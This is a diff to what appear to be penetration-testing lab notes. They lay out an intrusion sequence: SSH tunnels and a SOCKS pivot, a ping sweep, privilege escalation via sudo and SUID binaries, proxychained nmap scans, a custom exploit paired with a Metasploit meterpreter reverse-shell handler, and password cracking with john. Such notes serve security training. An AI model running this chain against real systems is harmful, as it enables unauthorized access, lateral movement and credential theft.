@@ -1,4 +1,4 @@
-                                                                                                        INPUT ALL COMMANDS AND OUTPUTS INTO A TEXT FILE FOR FUTURE REFERENCE
+                                                                                                        INPUT ALL SUCCESSFUL COMMANDS AND OUTPUTS INTO A TEXT FILE FOR FUTURE REFERENCE
 
 
 
@@ -52,8 +52,9 @@
 
 
 
-###Create a new tunnel and tear down the Dynamic Tunnel
+###Create a new tunnel and TEAR DOWN THE OLD DYMANIC TUNNEL
         ssh -S /tmp/initial_box -O forward -L 1111:192.168.28.172:80 -L 2222:192.168.28.172:22
+        ssh -S /tmp/initial_box -O forward -D 9050
         ssh -S /tmp/initial_box -O forward -L 3333:192.168.28.181:22
 
 
@@ -78,7 +79,82 @@
 
 ###SSH into box
         ssh -p 2222 Aaron@127.0.0.1
-        
+                Enumerate File System
+
+
+
+###Scan network Again to verify There are no others
+        for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &2>/dev/null) ;done
+
+
+
+###Escalate Privileges
+        sudo -l
+                https://gtfobins.github.io
+                show verification of escalated privileges
+        IF THIS DOES NOT WORK
+                find / -type f -perm /6000 -ls 2>/dev/null
+                        https://gtfobins.github.io
+        IF EVEN THAT DOESN'T WORK
+                lin_buff.py (Linux priv escalation)
+        Enumerate File System if told to
+
+
+
+###Scan any IP that may have been found
+        proxychains nmap -Pn -T5 192.168.28.179
+        proxychains nmap -Pn -T5 --script=banner 192.168.28.179
+        BANNER GRAB ALL PORTS
+                proxychains nc 192.168.28.179 9999
+
+
+
+###Create a tunnel to connect to Secure Server and Exploit
+        ssh -MS /tmp/next_jump -p 2222 Aaron@127.0.0.1
+        ssh -S /tmp/next_jump LOGOS -L 9999:192.168.28.179:9999 -L 4444:192.168.28.179:22 -L 3333:192.168.28.179:3389
+
+
+
+###USE SHELL CODE EXPLOIT
+        secureserver.py (windows priv escalation)
+                change s.connect (127.0.0.1,SECURE SERVER TUNNEL PORT)
+        use mfconsole
+                use exploit multi/handler
+                set payload windows/meterpreter/reverse_tcp
+                        set LHOST 127.0.0.1
+                        set LPORT (msfvenom lport from secureserver.py)
+        python secureserver.py
+        Enumerate System
+
+
+
+###IF neccesary RDP after escalation and downloaded passwords and john
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
